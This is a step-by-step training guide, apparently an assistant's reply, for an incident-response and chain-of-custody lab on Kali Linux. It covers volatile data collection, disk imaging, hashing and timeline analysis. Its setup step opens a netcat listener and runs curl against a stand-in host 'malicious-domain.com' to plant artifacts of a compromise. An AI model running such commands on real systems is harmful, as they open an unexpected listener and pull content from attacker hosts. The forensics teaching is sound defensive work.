@@ -1,0 +1,193 @@
+Here’s a **step-by-step lab and demo guide** for **Simulating Incident Response and Chain of Custody Handling on Kali Linux**, ideal for cybersecurity, digital forensics, or incident response training environments.
+
+---
+
+## 🎯 **Objective**
+
+* Simulate a basic **cyber incident (compromise or malware infection)**
+* Perform **initial incident response steps**
+* Properly handle **digital evidence**
+* Maintain a **chain of custody**
+
+---
+
+## 🧰 Tools Used (All on Kali)
+
+| Purpose                        | Tools/Commands                                   |
+| ------------------------------ | ------------------------------------------------ |
+| Evidence collection            | `dd`, `dcfldd`, `hashdeep`, `sha256sum`          |
+| Live response (RAM, logs)      | `ps`, `lsof`, `netstat`, `tcpdump`, `volatility` |
+| Timeline & filesystem analysis | `log2timeline`, `Autopsy`, `fls`, `icat`         |
+| Documentation                  | CSV log files, manual notes                      |
+
+---
+
+# 🧪 PART 1: Simulate an Incident
+
+### ✅ 1. Simulate Compromise (Example)
+
+On a test VM (NOT your host system):
+
+```bash
+touch /tmp/.malware
+echo "Malicious code running..." > /tmp/.malware
+nc -lvp 4444 &
+```
+
+You can also run a script simulating data exfiltration:
+
+```bash
+curl http://malicious-domain.com/data -o /tmp/stolen_data.txt
+```
+
+---
+
+## 🪪 PART 2: Chain of Custody Log (Manual or Scripted)
+
+Create a `chain_of_custody.csv` file:
+
+```csv
+Entry ID, DateTime, Examiner, Evidence Description, Action, Hash, Location
+001, 2025-07-22 12:30, Analyst1, /tmp/.malware, Collected, <hash>, /evidence
+```
+
+✅ Be sure to log every action:
+
+* Who handled it
+* When
+* What was done
+
+**You can also automate using a bash script (let me know if you want one)**
+
+---
+
+# 🧯 PART 3: First Response – Volatile Data Collection
+
+### ✅ 1. List Running Processes
+
+```bash
+ps aux > ps_output.txt
+```
+
+### ✅ 2. Open Network Connections
+
+```bash
+netstat -tulnp > netstat_output.txt
+```
+
+### ✅ 3. Open Files and Sockets
+
+```bash
+lsof > lsof_output.txt
+```
+
+### ✅ 4. Capture Memory (if supported)
+
+If you have `LiME` (Linux Memory Extractor) or use `avml`, grab a RAM image for volatility analysis.
+
+---
+
+# 💾 PART 4: Evidence Acquisition – Disk Imaging
+
+### ✅ 1. Acquire Disk Image
+
+```bash
+sudo dcfldd if=/dev/sdX of=/evidence/incident.img hash=sha256 hashlog=incident.hash
+```
+
+Log hash in chain of custody.
+
+### ✅ 2. Verify Integrity
+
+```bash
+sha256sum /evidence/incident.img
+```
+
+Compare with the hash recorded in `incident.hash`.
+
+---
+
+# 🔍 PART 5: Evidence Analysis
+
+### ✅ 1. Mount the Image (optional)
+
+```bash
+sudo mkdir /mnt/incident
+sudo mount -o loop incident.img /mnt/incident
+```
+
+Look for:
+
+* Hidden files (`ls -la`)
+* Suspicious scripts or cron jobs
+* `/etc/shadow`, `/var/log`, `/tmp`
+
+### ✅ 2. Use Sleuth Kit
+
+```bash
+fls -r -m / incident.img > bodyfile.txt
+icat incident.img <inode> > suspicious_file.txt
+```
+
+### ✅ 3. Create Timeline with Plaso
+
+```bash
+log2timeline.py incident.dump incident.img
+psort.py -o l2tcsv -w timeline.csv incident.dump
+```
+
+---
+
+# 🔐 PART 6: Document Your Findings
+
+### Report Template:
+
+1. **Executive Summary**
+2. **Incident Description**
+3. **Initial Response**
+4. **Evidence Details**
+5. **Chain of Custody Log**
+6. **Analysis and Findings**
+7. **Conclusion and Recommendations**
+8. **Appendices (logs, hashes, screenshots)**
+
+---
+
+## 🧪 LAB SCENARIO IDEA
+
+### 📘 Lab Title: *Simulating Incident Response with Chain of Custody*
+
+1. Instructor plants suspicious activity (hidden malware, netcat listener)
+2. Student plays IR analyst:
+
+   * Detects signs (unusual process, netstat anomalies)
+   * Captures logs and memory
+   * Acquires disk image
+   * Maintains evidence log and custody chain
+   * Analyzes evidence with forensic tools
+   * Submits report
+
+---
+
+## ✅ Summary Table
+
+| Task                  | Tool/Command                            |
+| --------------------- | --------------------------------------- |
+| Log chain of custody  | `CSV`, manual or scripted               |
+| Acquire evidence      | `dd`, `dcfldd`, `sha256sum`             |
+| Collect volatile data | `ps`, `lsof`, `netstat`, `tcpdump`      |
+| Analyze filesystem    | `Autopsy`, `Sleuth Kit`, `log2timeline` |
+| RAM forensics         | `volatility` (with RAM image)           |
+| Documentation         | Markdown, PDF, Excel, LibreOffice       |
+
+---
+
+## 🧩 Optional Add-ons
+
+Would you like:
+
+* ✅ A downloadable **chain-of-custody log template** (CSV/ODS)?
+* ✅ A **sample compromised VM** or `.img` file for students to analyze?
+* ✅ An **automated Bash script** to handle evidence logging and hashing?
+
+Let me know and I can provide the exact resources!
